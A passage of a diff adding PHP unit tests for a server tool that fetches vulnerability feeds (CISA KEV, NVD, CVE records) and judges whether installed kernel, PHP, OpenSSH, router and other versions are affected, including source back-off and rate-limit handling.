+        [array_map(fn ($a) => [$a['vendor'], $a['product'], count($a['versions'])], $red['affected']), watchmanVulnVerdict($red, WATCH_VULN_PRODUCTS['kernel']['cna'], '4.8.1')]);
+    // NVD says slow down: the batch ends, what came stays, the status says so
+    $dir2 = "$tmp/data2";
+    @mkdir($dir2, 0700, true);
+    $n429 = 0;
+    $get429 = function (string $url, ?string $since) use ($get, &$n429): array {
+        if (str_contains($url, 'nvd.nist.gov')) {
+            $n429++;
+            return ['code' => 429, 'body' => '', 'lm' => null, 'err' => null];
+        }
+        return $get($url, $since);
+    };
+    watchmanVulnFetch($dir2, ['get' => $get429, 'now' => $now, 'sleep' => $sleep, 'unsure' => ['CVE-2016-5195', 'CVE-2014-6278']]);
+    same('vuln nvd: «429 Too Many Requests» — the batch ends at once, the rest the next day, said in its status', [1, 'HTTP 429'],
+        [$n429, readJson(watchmanVulnDir($dir2) . '/status.json')['nvd']['err'] ?? null]);
+
+    // 2026-11-26: one request without an answer no longer ends the day — noted, the gap waited, the next id asked; the id
+    // that failed stays due (nothing written). Two in a row: away. 403/429: at once, as before.
+    $three = ['CVE-2016-5195', 'CVE-2014-6278', 'CVE-2021-3156'];
+    $run = function (string $name, array $codes, array $ctx = []) use ($tmp, $get, $now, $three): array {
+        $d = "$tmp/$name";
+        @mkdir($d, 0700, true);
+        $nvd = [];
+        $gaps = 0;
+        $g = function (string $url, ?string $since) use ($get, &$nvd, $codes, $ctx): array {
+            if (!str_contains($url, 'nvd.nist.gov')) {
+                return $get($url, $since);
+            }
+            $code = $codes[count($nvd)] ?? 200;
+            $nvd[] = substr($url, strrpos($url, '=') + 1);
+            ($ctx['asked'] ?? fn () => null)();
+            return $code === 200 ? $get($url, $since) : ['code' => $code, 'body' => '', 'lm' => null, 'err' => $code === 0 ? 'curl 28: Operation timed out' : "HTTP $code"];
+        };
+        $r = watchmanVulnFetch($d, $ctx + ['get' => $g, 'now' => $now, 'sleep' => function () use (&$gaps): void { $gaps++; }, 'unsure' => $three]);
+        $st = readJson(watchmanVulnDir($d) . '/status.json')['nvd'] ?? [];
+        $kept = array_map(fn ($f) => basename($f, '.json'), glob(watchmanVulnDir($d) . '/nvd/CVE-*.json') ?: []);
+        sort($kept);
+        return [$nvd, $r['nvd'], $gaps, $st['err'] ?? null, $st['fails'] ?? null, $kept];
+    };
+    same('vuln nvd: a timeout, then answers — noted, the gap waited, the next asked; 2 kept, the one that failed stays due; one answer is an answer',
+        [$three, 2, 2, 'curl 28: Operation timed out', null, ['CVE-2014-6278', 'CVE-2021-3156']], $run('nvd-one', [0, 200, 200]));
+    same('vuln nvd: two timeouts in a row — away: the rest another day, a failed try (back-off)',
+        [['CVE-2016-5195', 'CVE-2014-6278'], 0, 1, 'curl 28: Operation timed out', 1, []], $run('nvd-two', [0, 0, 200]));
+    same('vuln nvd: a timeout between answers is never two in a row — all three asked',
+        [$three, 2, 2, 'curl 28: Operation timed out', null, ['CVE-2016-5195', 'CVE-2021-3156']], $run('nvd-turn', [200, 0, 200]));
+    same('vuln nvd: «403 Forbidden» after a timeout — ends at once', [['CVE-2016-5195', 'CVE-2014-6278'], 0, 1, 'HTTP 403', 1, []],
+        $run('nvd-403', [0, 403, 200]));
+    same('vuln nvd: «429» as the first answer — ends at once', [['CVE-2016-5195'], 0, 0, 'HTTP 429', 1, []], $run('nvd-429', [429]));
+    // the job's time: no request starts that could end after WATCH_VULN_NVD_TIME (a clock that moves 300 s each time it is
+    // read once NVD was asked — slow requests; before, the records' part reads it too): the third would end past it, so it
+    // isn't asked; endoflife.date's part keeps its own bound
+    $t = 0.0;
+    $slow = new ArrayObject(['on' => false]);
+    $clock = function () use (&$t, $slow): float {
+        return $t += $slow['on'] ? 300 : 0;
+    };
+    same('vuln nvd: the time bound — the first two asked (a timeout, an answer), the third would end past WATCH_VULN_NVD_TIME: the next day',
+        [['CVE-2016-5195', 'CVE-2014-6278'], 1, 'curl 28: Operation timed out', null], array_values(array_intersect_key($run('nvd-time', [0, 200, 200],
+            ['clock' => $clock, 'asked' => function () use ($slow): void { $slow['on'] = true; }]), [0 => 1, 1 => 1, 3 => 1, 4 => 1])));
+}
+
+/**
+ * Sources that don't answer (2026-11-23): each on its own back-off — tried again the next day, each further failure
+ * doubles the wait up to a week, one answer resets it; «no such record» (404) is an answer, not a failure; a source
+ * waiting isn't asked at all; after three failures in a row the page gets a calm line (which, since when, when again) —
+ * never a colour, never told.
+ */
+function testWatchmanVulnBackoff(): void
+{
+    $d = 86400;
+    $t0 = 1_795_000_000;
+    $s = [];
+    $waits = [];
+    foreach ([1, 2, 3, 4, 5] as $i) {
+        $s = watchmanVulnBackoff($s, 'HTTP 503', $t0 + $i);
+        $waits[] = ($s['next'] - ($t0 + $i)) / $d;
+    }
+    same('vuln back-off: the next day, then 2, 4, 7 (at most a week), 7; since the first failure; one answer forgets it all',
+        [[1, 2, 4, 7, 7], 5, $t0 + 1, ['try' => $t0 + 9, 'ok' => $t0 + 9]],
+        [$waits, $s['fails'], $s['since'], watchmanVulnBackoff($s, null, $t0 + 9)]);
+    same('vuln back-off: asked again only when its day has come (5 min early is fine); a clock set far back: asked',
+        [false, true, true, true], [watchmanVulnSourceDue(['nvd' => ['next' => $t0 + $d]], 'nvd', $t0 + 3600), watchmanVulnSourceDue(['nvd' => ['next' => $t0 + $d]], 'nvd', $t0 + $d - 60),
+         watchmanVulnSourceDue([], 'nvd', $t0), watchmanVulnSourceDue(['nvd' => ['next' => $t0 + 30 * $d]], 'nvd', $t0)]);
+    same('vuln back-off: the source away — no connection, «slow down», forbidden, a server error; «no such record» is an answer',
+        [true, true, true, true, false, false], array_map('watchmanVulnSourceDown', [0, 429, 403, 503, 404, 200]));
+
+    // the day's job over a week: the NVD never answers (no connection), CISA's list fails twice then answers again
+    $tmp = hardeningTmp('vuln-backoff');
+    $dir = "$tmp/data";
+    @mkdir($dir, 0700, true);
+    $kev = [['cveID' => 'CVE-2016-5195', 'vendorProject' => 'Linux', 'product' => 'Kernel', 'vulnerabilityName' => 'Linux Kernel Race Condition Vulnerability', 'dateAdded' => '2022-03-03']];
+    for ($i = 0; $i < 120; $i++) {
+        $kev[] = ['cveID' => sprintf('CVE-2023-%05d', 40000 + $i), 'vendorProject' => 'Example Corp', 'product' => "Switch $i"];
+    }
+    $kevBody = json_encode(['count' => count($kev), 'vulnerabilities' => $kev]);
+    $kevDown = [];          // the days CISA doesn't answer
+    /** @var array<int, list<string>> $asked */
+    $asked = [];
+    /** @var list<int> $kevDown */
+    $kevDown = [];
+    $day = 0;               // the job's day (the loop below)
+    $get = function (string $url, ?string $since) use (&$asked, &$kevDown, $kevBody, &$day): array {
+        $asked[$day][] = $url;
+        if ($url === WATCH_VULN_URLS['kev']) {
+            return in_array($day, $kevDown, true) ? ['code' => 0, 'body' => '', 'lm' => null, 'err' => 'timeout'] : ['code' => 200, 'body' => $kevBody, 'lm' => null, 'err' => null];
+        }
+        if (str_contains($url, 'nvd.nist.gov')) {
+            return ['code' => 0, 'body' => '', 'lm' => null, 'err' => 'Could not resolve host'];
+        }
+        if ($url === WATCH_VULN_URLS['unraid']) {
+            return ['code' => 200, 'body' => json_encode([['version' => '7.4.1', 'supportStatus' => 'supported', 'date' => '2026-11-10']]), 'lm' => null, 'err' => null];
+        }
+        if (str_starts_with($url, WATCH_VULN_URLS['eol'])) {
+            return ['code' => 200, 'body' => json_encode(['result' => ['releases' => [['name' => '8.4', 'isEol' => false]]]]), 'lm' => null, 'err' => null];
+        }
+        return ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];      // the CVE record: no such record — an answer
+    };
+    $kevDown = [1, 2];
+    $nvdAsked = [];
+    for ($day = 0; $day <= 8; $day++) {
+        watchmanVulnFetch($dir, ['get' => $get, 'now' => $t0 + $day * $d, 'sleep' => fn () => null, 'unsure' => ['CVE-2016-5195']]);
+        $nvdAsked[$day] = count(array_filter($asked[$day] ?? [], fn ($u) => str_contains($u, 'nvd.nist.gov')));
+    }
+    $st = readJson(watchmanVulnDir($dir) . '/status.json');
+    same('vuln back-off: the NVD asked on days 0, 1, 3, 7 (1, 2, 4 days apart), not between; CISA\'s list failed twice, answered again — forgotten',
+        [[1, 1, 0, 1, 0, 0, 0, 1, 0], 4, $t0, $t0 + 14 * $d, ['try' => $t0 + 8 * $d, 'ok' => $t0 + 8 * $d], null],
+        [array_values($nvdAsked), $st['nvd']['fails'] ?? null, $st['nvd']['since'] ?? null, $st['nvd']['next'] ?? null,
+         array_intersect_key($st['kev'] ?? [], ['try' => 1, 'ok' => 1, 'fails' => 1]), $st['cve']['fails'] ?? null]);
+    same('vuln back-off: CISA\'s list away on days 1 and 2 — asked on 1 and 2, waiting on day 3, answering on day 4', [1, 1, 0, 1],
+        array_map(fn ($day) => count(array_filter($asked[$day] ?? [], fn ($u) => $u === WATCH_VULN_URLS['kev'])), [1, 2, 3, 4]));
+
+    // the page: only a source away three times in a row; the judge hands it to the page
+    $down = watchmanVulnDown($st);
+    $j = watchmanVulnJudge($dir, [['product' => 'kernel', 'version' => '6.18.64-Unraid', 'clean' => '6.18.64', 'where' => 'host']], $t0 + 8 * $d + 60);
+    same('vuln back-off: the page says the NVD is away (since day 0, again on day 14); not CISA\'s list (it answered); judged and handed on',
+        [[['src' => 'nvd', 'since' => $t0, 'next' => $t0 + 14 * $d, 'ok' => null, 'fails' => 4]], ['nvd']],
+        [$down, array_column(watchmanVulnPage(['vuln_on' => true], $j)['down'], 'src')]);
+    same('vuln back-off: two failures — nothing said yet', [], watchmanVulnDown(['nvd' => ['fails' => 2, 'since' => $t0]]));
+}
+
+/**
+ * Routers in «Known vulnerabilities» (2026-11-23) — passive only: RouterOS by the version its own log said (watchnet's
+ * net.json), the UniFi Network Application by its CEF header or as a container here (UNIFI_VERSION, or the OCI version
+ * label of an image named «unifi» — never another image's label); KEV's MikroTik entry judged by its record's ADP range
+ * («n/a» CNA, CPE mikrotik:routeros); a router whose log never said its version: «version unknown», no unsure line.
+ */
+function testWatchmanVulnRouters(): void
+{
+    $net = ['v' => 1, 'senders' => [
+        '10.77.3.10' => ['meta' => ['vendor' => 'MikroTik', 'product' => 'RouterOS', 'version' => '7.24.5', 'version_at' => 1_794_000_000, 'host' => 'lab-chr']],
+        '10.77.3.11' => ['meta' => ['vendor' => 'MikroTik', 'product' => 'RouterOS', 'version' => null, 'host' => 'office-ap']],
+        '192.0.2.1'  => ['meta' => ['vendor' => 'Ubiquiti', 'product' => 'UniFi Network', 'version' => '10.6.106', 'version_at' => 1_794_100_000, 'host' => 'gw']],
+        '10.77.3.99' => ['meta' => ['vendor' => null, 'product' => null, 'version' => null, 'host' => 'nas']]]];
+    $routers = watchmanVulnRouters($net);
+    same('vuln routers: by vendor — RouterOS twice (one without a version), UniFi; the unknown sender none',
+        [['routeros', '7.24.5', '10.77.3.10'], ['routeros', '', '10.77.3.11'], ['unifi', '10.6.106', '192.0.2.1']],
+        array_map(fn ($r) => [$r['product'], $r['version'], $r['sender']], $routers));
+    // an image's labels: only one named «unifi» gives its OCI version; linuxserver's «-ls78» cut off by the env's cleaning
+    $ls = 'lscr.io/linuxserver/unifi-network-application:latest';
+    $imgs = watchmanVulnImagesParse(['nextcloud:30' => 'sha256:bbb PHP_VERSION=8.4.14 OCI_VERSION=2.1.0', 'jacobalberty/unifi:v8' => 'sha256:ccc UNIFI_VERSION=8.6.9'],
+        [$ls => 'sha256:aaa OCI_VERSION=9.0.114-ls78', 'nextcloud:30' => 'sha256:bbb OCI_VERSION=2.1.0'], [$ls, 'nextcloud:30', 'jacobalberty/unifi:v8']);
+    same('vuln routers: the OCI version label only of an image named «unifi» (kept as the product\'s, 2026-11-26); UNIFI_VERSION from the environment',
+        [['OCI:unifi' => '9.0.114-ls78'], ['PHP_VERSION' => '8.4.14'], ['UNIFI_VERSION' => '8.6.9']], array_values($imgs));
+    $inv = watchmanVulnInventory(['kernel' => '6.18.64-Unraid', 'php' => '8.4.14', 'vuln_routers' => $routers,
+        'vuln_images' => ['unifi' => $imgs['lscr.io/linuxserver/unifi-network-application:latest'], 'cloud' => $imgs['nextcloud:30']]]);
+    same('vuln routers: in the inventory — RouterOS 7.24.5 and UniFi 10.6.106 by their logs, the container\'s UniFi 9.0.114; none without a version',
+        [['unifi', '9.0.114-ls78', '9.0.114', 'unifi'], ['routeros', '7.24.5', '7.24.5', 'host'], ['unifi', '10.6.106', '10.6.106', 'host']],
+        array_values(array_map(fn ($x) => [$x['product'], $x['version'], $x['clean'], $x['where']], array_filter($inv, fn ($x) => in_array($x['product'], ['routeros', 'unifi'], true)))));
+    same('vuln routers: KEV\'s names — MikroTik RouterOS, Ubiquiti UniFi Network Application', ['routeros', 'unifi'],
+        [watchmanVulnKevProduct('MikroTik', 'RouterOS'), watchmanVulnKevProduct('Ubiquiti', 'UniFi Network Application')]);
+    // KEV's Winbox entry (CVE-2018-14847): its CNA wrote «n/a», CISA's ADP the range by CPE
+    $rec = watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2018-14847'], 'containers' => [
+        'cna' => ['affected' => [['vendor' => 'n/a', 'product' => 'n/a', 'versions' => [['version' => 'n/a', 'status' => 'affected']]]]],
+        'adp' => [['providerMetadata' => ['shortName' => 'CISA-ADP'], 'affected' => [['vendor' => 'mikrotik', 'product' => 'routeros', 'defaultStatus' => 'unknown',
+            'versions' => [['version' => '6.29', 'status' => 'affected', 'lessThanOrEqual' => '6.42', 'versionType' => 'custom']]]]]]]]);
+    same('vuln routers: Winbox (CVE-2018-14847) — RouterOS 7.24.5 not affected, 6.40.5 affected', ['no', 'yes'],
+        [watchmanVulnVerdict($rec, WATCH_VULN_PRODUCTS['routeros']['cna'], '7.24.5')[0], watchmanVulnVerdict($rec, WATCH_VULN_PRODUCTS['routeros']['cna'], '6.40.5')[0]]);
+    // the page: each router with its version and since when, or «version unknown»
+    $tmp = hardeningTmp('vuln-routers');
+    @mkdir(watchmanVulnDir($tmp), 0700, true);
+    $j = watchmanVulnJudge($tmp, $inv, 1_795_000_000, [], $routers);
+    same('vuln routers: the page lists them — known with since when, the one without a version plainly unknown; nothing unsure for it',
+        [[['MikroTik RouterOS', '7.24.5', 1_794_000_000], ['MikroTik RouterOS', '', null], ['UniFi Network', '10.6.106', 1_794_100_000]], []],
+        [array_map(fn ($r) => [$r['label'], $r['version'], $r['at']], watchmanVulnPage(['vuln_on' => true], $j)['routers']), $j['unsure']]);
+}
+
+function testWatchmanVuln(): void
+{
+    $tmp = hardeningTmp('watch-vuln');
+    // versions
+    same('vuln versions: plain, p-levels; a branch, a commit, n/a, an rc — none', [[[6, 12, 24], 0], [[9, 7], 1], null, null, null, null],
+        [watchmanVulnParse('6.12.24'), watchmanVulnParse('9.7p1'), watchmanVulnParse('8.1.*'), watchmanVulnParse('a1b2c3d4'), watchmanVulnParse('n/a'), watchmanVulnParse('6.13-rc1')]);
+    same('vuln versions: compared with padding and the p-level', [-1, 0, 1, -1, 1],
+        [watchmanVulnCmp(watchmanVulnParse('6.12.24'), watchmanVulnParse('6.12.48')), watchmanVulnCmp(watchmanVulnParse('8.4'), watchmanVulnParse('8.4.0')),
+         watchmanVulnCmp(watchmanVulnParse('9.7p1'), watchmanVulnParse('9.7')), watchmanVulnCmp(watchmanVulnParse('9.7p1'), watchmanVulnParse('9.8')),
+         watchmanVulnCmp(watchmanVulnParse('10.0'), watchmanVulnParse('9.9p2'))]);
+    same('vuln versions: as the sources write them', ['6.12.54', '7.4.1', null, '3.5.4'],
+        [watchmanVulnClean('6.12.54-Unraid', 'kernel'), watchmanVulnClean('7.4.1'), watchmanVulnClean('7.3.0-beta.2'), watchmanVulnClean('3.5.4')]);
+
+    // the kernel CNA: a git item (commits) and a semver item — unaffected before 2.6.12, fixed per branch, fixed from 6.16 on
+    $kernel = ['affected' => [
+        ['vendor' => 'Linux', 'product' => 'Linux', 'defaultStatus' => 'unaffected', 'versions' => [['version' => '1da177e4c3f4', 'lessThan' => 'a1b2c3d4e5f6', 'status' => 'affected', 'versionType' => 'git']]],
+        ['vendor' => 'Linux', 'product' => 'Linux', 'defaultStatus' => 'affected', 'versions' => [
+            ['version' => '2.6.12', 'status' => 'affected'],
+            ['version' => '0', 'lessThan' => '2.6.12', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '5.4.295', 'lessThanOrEqual' => '5.4.*', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '6.12.48', 'lessThanOrEqual' => '6.12.*', 'status' => 'unaffected', 'versionType' => 'semver'],
+            ['version' => '6.16', 'lessThanOrEqual' => '*', 'status' => 'unaffected', 'versionType' => 'original_commit_for_fix']]]]];
+    $kc = WATCH_VULN_PRODUCTS['kernel']['cna'];
+    same('vuln kernel: 6.12.24 — affected, fixed in its branch from 6.12.48; 6.12.50 and 6.17.1 not; 6.11.5 (no fix in its branch) affected; 2.6.11 not',
+        [['yes', '6.12.48'], ['no', null], ['no', null], ['yes', null], ['no', null]],
+        array_map(fn ($v) => watchmanVulnVerdict($kernel, $kc, $v), ['6.12.24', '6.12.50', '6.17.1', '6.11.5', '2.6.11']));
+    // PHP: branch ranges, defaultStatus affected; CVE-2024-4577 only on Windows
+    $php = ['affected' => [['vendor' => 'PHP Group', 'product' => 'PHP', 'defaultStatus' => 'affected', 'versions' => [
+        ['version' => '8.1.*', 'lessThan' => '8.1.29', 'status' => 'affected', 'versionType' => 'semver'],
+        ['version' => '8.2.*', 'lessThan' => '8.2.20', 'status' => 'affected', 'versionType' => 'semver'],
+        ['version' => '8.3.*', 'lessThan' => '8.3.8', 'status' => 'affected', 'versionType' => 'semver']]]]];
+    $pc = WATCH_VULN_PRODUCTS['php']['cna'];
+    same('vuln php: 8.3.4 affected (fixed from 8.3.8); 8.3.9 and 8.2.25 fixed in their branch; 8.4.28 newer than every range the record names; 7.4.33 older than all — affected by default',
+        [['yes', '8.3.8'], ['no', '8.3.8'], ['no', '8.2.20'], ['no', '8.3.8'], ['yes', null]],
+        array_map(fn ($v) => watchmanVulnVerdict($php, $pc, $v), ['8.3.4', '8.3.9', '8.2.25', '8.4.28', '7.4.33']));
+    $win = $php;
+    $win['affected'][0]['platforms'] = ['Windows'];
+    same('vuln php: a Windows-only record (CVE-2024-4577) — not for this server', ['no', null], watchmanVulnVerdict($win, $pc, '8.3.4'));
+    // Red Hat's OpenSSH (CVE-2024-6387): the upstream item by its package name alone, RHEL's rpm items beside it
+    $ssh = ['affected' => [['packageName' => 'OpenSSH', 'defaultStatus' => 'unaffected', 'versions' => [['version' => '8.5p1', 'lessThanOrEqual' => '9.7p1', 'status' => 'affected', 'versionType' => 'custom']]],
+        ['vendor' => 'Red Hat', 'product' => 'Red Hat Enterprise Linux 9', 'packageName' => 'openssh', 'defaultStatus' => 'affected',
+         'versions' => [['version' => '0:8.7p1-38.el9_4.1', 'lessThan' => '*', 'status' => 'unaffected', 'versionType' => 'rpm']]]]];
+    $sc = WATCH_VULN_PRODUCTS['openssh']['cna'];
+    same('vuln openssh: 9.6p1 affected, 9.8p1 and 8.4p1 not — RHEL\'s rpm item never decides', [['yes', '9.7p1'], ['no', null], ['no', null]],
+        array_map(fn ($v) => watchmanVulnVerdict($ssh, $sc, $v), ['9.6p1', '9.8p1', '8.4p1']));
+    // what can't be compared: maybe — never «not» by default alone, never «affected»
+    $na = ['affected' => [['vendor' => 'n/a', 'product' => 'n/a', 'versions' => [['version' => 'n/a', 'status' => 'affected']]]]];
+    $git = ['affected' => [['vendor' => 'Linux', 'product' => 'Linux', 'defaultStatus' => 'affected', 'versions' => [['version' => 'abc123', 'lessThan' => 'def456', 'status' => 'affected', 'versionType' => 'git']]]]];
+    $both = ['affected' => [['vendor' => 'Samba', 'product' => 'Samba', 'versions' => [['version' => '4.0', 'lessThan' => '4.30', 'status' => 'affected'], ['version' => '4.22', 'lessThan' => '4.23', 'status' => 'unaffected']]]]];
+    $unknown = ['affected' => [['vendor' => 'Samba', 'product' => 'Samba', 'versions' => [['version' => '4.10', 'lessThan' => '4.12', 'status' => 'affected']]]]];
+    same('vuln maybe: «n/a» (no item of the product), only commits, ranges that contradict each other, no defaultStatus and below the ranges, no record at all, a version that isn\'t clean',
+        ['maybe', 'maybe', 'maybe', 'maybe', 'maybe', 'maybe'],
+        [watchmanVulnVerdict($na, WATCH_VULN_PRODUCTS['unraid']['cna'], '7.4.1')[0], watchmanVulnVerdict($git, $kc, '6.12.24')[0],
+         watchmanVulnVerdict($both, WATCH_VULN_PRODUCTS['samba']['cna'], '4.22.5')[0], watchmanVulnVerdict($unknown, WATCH_VULN_PRODUCTS['samba']['cna'], '4.9.1')[0],
+         watchmanVulnVerdict(null, $kc, '6.12.24')[0], watchmanVulnItem($kernel['affected'][1], '6.13-rc1')[0]]);
+    // no defaultStatus (the record says nothing outside its ranges), every range clean and closed, this version past all
+    // of them: fixed long ago (2026-11-23: 39 «maybe» lines of kernel CVEs from 2010–2024 on a current kernel)
+    same('vuln: no defaultStatus, past every range it names — not affected (never «maybe» for a fix long done)', ['no', 'yes'],
+        [watchmanVulnVerdict($unknown, WATCH_VULN_PRODUCTS['samba']['cna'], '4.22.5')[0], watchmanVulnVerdict($unknown, WATCH_VULN_PRODUCTS['samba']['cna'], '4.11.2')[0]]);
+
+    // the fetch against recorded answers: KEV (fillers of other vendors, real-shaped entries of the name table's), the CVE records, Unraid's releases
+    $kevEntry = fn (string $cve, string $vendor, string $product, string $name, string $added = '2024-05-30') => ['cveID' => $cve, 'vendorProject' => $vendor,
+        'product' => $product, 'vulnerabilityName' => $name, 'dateAdded' => $added, 'shortDescription' => "$name.", 'requiredAction' => 'Apply updates.',
+        'dueDate' => '2024-06-20', 'knownRansomwareCampaignUse' => 'Unknown', 'notes' => '', 'cwes' => []];
+    $kevList = [array_merge($kevEntry('CVE-2024-1086', 'Linux', 'Kernel', 'Linux Kernel Use-After-Free Vulnerability'), ['knownRansomwareCampaignUse' => 'Known']),
+        $kevEntry('CVE-2024-4577', 'PHP Group', 'PHP', 'PHP-CGI OS Command Injection Vulnerability'),
+        $kevEntry('CVE-2020-5847', 'Unraid', 'Unraid', 'Unraid Remote Code Execution Vulnerability', '2021-11-03'),
+        $kevEntry('CVE-2025-32463', 'Sudo', 'Sudo', 'Sudo Inclusion of Functionality from Untrusted Control Sphere Vulnerability')];
+    for ($i = 0; $i < 120; $i++) {
+        $kevList[] = $kevEntry(sprintf('CVE-2023-%05d', 10000 + $i), 'Example Corp', "Router $i", 'Example Router Vulnerability');
+    }
+    $kev = ['title' => 'CISA Catalog of Known Exploited Vulnerabilities', 'catalogVersion' => '2026.11.20', 'dateReleased' => '2026-11-20T17:48:39.1516Z',
+            'count' => count($kevList), 'vulnerabilities' => $kevList];
+    $cveRec = fn (string $id, array $affected) => json_encode(['dataType' => 'CVE_RECORD', 'cveMetadata' => ['cveId' => $id, 'state' => 'PUBLISHED'],
+        'containers' => ['cna' => ['affected' => $affected, 'descriptions' => [['lang' => 'en', 'value' => str_repeat('x', 5000)]]]]]);
+    $records = [
+        'CVE-2024-1086' => $cveRec('CVE-2024-1086', $kernel['affected']),
+        'CVE-2024-4577' => $cveRec('CVE-2024-4577', $win['affected']),
+        'CVE-2020-5847' => $cveRec('CVE-2020-5847', $na['affected']),
+        'CVE-2025-32463' => $cveRec('CVE-2025-32463', [['vendor' => 'sudo project', 'product' => 'sudo', 'defaultStatus' => 'unaffected',
+            'versions' => [['version' => '1.9.14', 'lessThan' => '1.9.17p1', 'status' => 'affected', 'versionType' => 'custom']]]]),
+    ];
+    $releases = json_encode([['version' => '7.4.1', 'supportStatus' => 'supported', 'date' => '2026-11-10'], ['version' => '7.3.6', 'supportStatus' => 'security-updates', 'date' => '2026-10-20'],
+        ['version' => '7.2.3', 'supportStatus' => 'eol', 'date' => '2025-12-01'], ['version' => '7.4.0', 'supportStatus' => 'superseded', 'date' => '2026-10-01'],
+        ['version' => '7.4.1', 'supportStatus' => 'weird']]);
+    /** @var list<array{0: string, 1: ?string}> $asked */
+    $asked = [];
+    $kevAnswer = fn (?string $since) => ['code' => 200, 'body' => json_encode($kev), 'lm' => 'Fri, 20 Nov 2026 17:48:39 GMT', 'err' => null];
+    $get = function (string $url, ?string $since) use (&$asked, &$kevAnswer, $records, $releases): array {
+        $asked[] = [$url, $since];
+        if ($url === WATCH_VULN_URLS['kev']) {
+            return $kevAnswer($since);
+        }
+        if ($url === WATCH_VULN_URLS['unraid']) {
+            return ['code' => 200, 'body' => $releases, 'lm' => null, 'err' => null];
+        }
+        foreach ($records as $id => $body) {
+            if ($url === watchmanVulnCveUrl($id)) {
+                return ['code' => 200, 'body' => $body, 'lm' => null, 'err' => null];
+            }
+        }
+        return ['code' => 404, 'body' => '404: Not Found', 'lm' => null, 'err' => 'HTTP 404'];
+    };
+    $dir = "$tmp/data";
+    @mkdir($dir, 0700, true);
+    $t0 = strtotime('2026-11-22 12:00:00');
+    $r = watchmanVulnFetch($dir, ['get' => $get, 'now' => $t0]);
+    $f = watchmanVulnDir($dir);
+    $kept = readJson("$f/kev.json");
+    same('vuln fetch: KEV, the four records the name table knows, Unraid\'s releases — nothing else asked, nothing failed', [
+        [WATCH_VULN_URLS['kev'], 'https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2024/1xxx/CVE-2024-1086.json',
+         'https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2024/4xxx/CVE-2024-4577.json',
+         'https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2020/5xxx/CVE-2020-5847.json',
+         'https://raw.githubusercontent.com/CVEProject/cvelistV5/main/cves/2025/32xxx/CVE-2025-32463.json', WATCH_VULN_URLS['unraid']],
+        ['kev' => null, 'cve' => 4, 'unraid' => null, 'nvd' => 0, 'ghsa' => 0]], [array_values(array_filter(array_column($asked, 0), fn ($u) => !str_starts_with($u, WATCH_VULN_URLS['eol']))), $r]);
+    same('vuln fetch: kept — only the name table\'s entries (whether here or not), its count, its Last-Modified; records reduced (no descriptions)',
+        [['CVE-2024-1086', 'CVE-2024-4577', 'CVE-2020-5847', 'CVE-2025-32463'], ['kernel', 'php', 'unraid', 'sudo'], 124, 'Fri, 20 Nov 2026 17:48:39 GMT', true, false],
+        [array_column($kept['entries'], 'cve'), array_column($kept['entries'], 'product'), $kept['count'], $kept['lm'], $kept['entries'][0]['ransom'],
+         str_contains((string) file_get_contents("$f/cve/CVE-2024-1086.json"), 'xxxxx')]);
+    same('vuln fetch: Unraid\'s releases — only the known statuses; root only', [['7.4.1', '7.3.6', '7.2.3', '7.4.0'], '600'],
+        [array_column(readJson("$f/unraid.json")['releases'], 'version'), decoct(fileperms("$f/kev.json") & 0777)]);
+    // the next day: only when newer — 304 keeps it
+    /** @var list<array{0: string, 1: ?string}> $asked */
+    $asked = [];
+    $kevAnswer = fn (?string $since) => $since === 'Fri, 20 Nov 2026 17:48:39 GMT' ? ['code' => 304, 'body' => '', 'lm' => null, 'err' => null]
+        : ['code' => 200, 'body' => json_encode($kev), 'lm' => null, 'err' => null];
+    $r = watchmanVulnFetch($dir, ['get' => $get, 'now' => $t0 + 86400]);
+    same('vuln fetch: the next day — «only when newer» (304: kept), the records not asked again within their week', [[WATCH_VULN_URLS['kev'], 'Fri, 20 Nov 2026 17:48:39 GMT'], [WATCH_VULN_URLS['unraid'], null], null, $t0 + 86400],
+        [$asked[0], $asked[1] ?? null, $r['kev'], readJson("$f/status.json")['kev']['ok'] ?? null]);
+    // kept by an office whose name table was another one (no mark, or another): the whole list once, never «only when newer»
+    foreach ([array_diff_key(readJson("$f/kev.json"), ['for' => 1]), ['for' => 'another'] + readJson("$f/kev.json")] as $older) {
+        writeAtomic("$f/kev.json", jsonEncode($older), 0600, 0, 0);
+        /** @var list<array{0: string, 1: ?string}> $asked */
+        $asked = [];
+        watchmanVulnFetch($dir, ['get' => $get, 'now' => $t0 + 86400]);
+        same('vuln fetch: a list another name table filtered — asked whole, and marked with this table', [[WATCH_VULN_URLS['kev'], null], watchmanVulnKevFor()],
+            [$asked[0] ?? null, readJson("$f/kev.json")['for'] ?? null]);
+    }
+    same('vuln fetch: the mark is 16 hex characters and the list kept as before', [1, 4], [preg_match('/^[0-9a-f]{16}$/D', watchmanVulnKevFor()), count(readJson("$f/kev.json")['entries'])]);
+    foreach (['<html>Access Denied</html>', '{"vulnerabilities":[]}', substr(json_encode($kev), 0, 5000)] as $bad) {
+        $kevAnswer = fn (?string $since) => ['code' => 200, 'body' => $bad, 'lm' => null, 'err' => null];
+        watchmanVulnFetch($dir, ['get' => $get, 'now' => $t0 + 2 * 86400]);
+    }
+    same('vuln fetch: a broken list — the kept one stays, the error noted, «ok» as it was', [4, 'shape', $t0 + 86400],
+        [count(readJson("$f/kev.json")['entries']), readJson("$f/status.json")['kev']['err'] ?? null, readJson("$f/status.json")['kev']['ok'] ?? null]);
+    // an entry leaves the list: its record goes; the run's cap
+    $kev['vulnerabilities'] = array_values(array_filter($kevList, fn ($e) => $e['cveID'] !== 'CVE-2025-32463'));
+    $kevAnswer = fn (?string $since) => ['code' => 200, 'body' => json_encode($kev), 'lm' => null, 'err' => null];
+    watchmanVulnFetch($dir, ['get' => $get, 'now' => $t0 + 3 * 86400]);
+    same('vuln fetch: an entry that left the list — its record gone', false, is_file("$f/cve/CVE-2025-32463.json"));
+
+    // curl: https only, no redirects, the cap, the fixed User-Agent — nothing of this server
+    $args = watchmanVulnCurl(WATCH_VULN_URLS['kev'], WATCH_VULN_MAX['kev'], 'Fri, 20 Nov 2026 17:48:39 GMT');
+    $line = implode(' ', $args);
+    check('vuln curl: https only, no redirects, a size cap, the fixed User-Agent, If-Modified-Since', str_contains($line, '--proto =https') && str_contains($line, '--max-redirs 0')
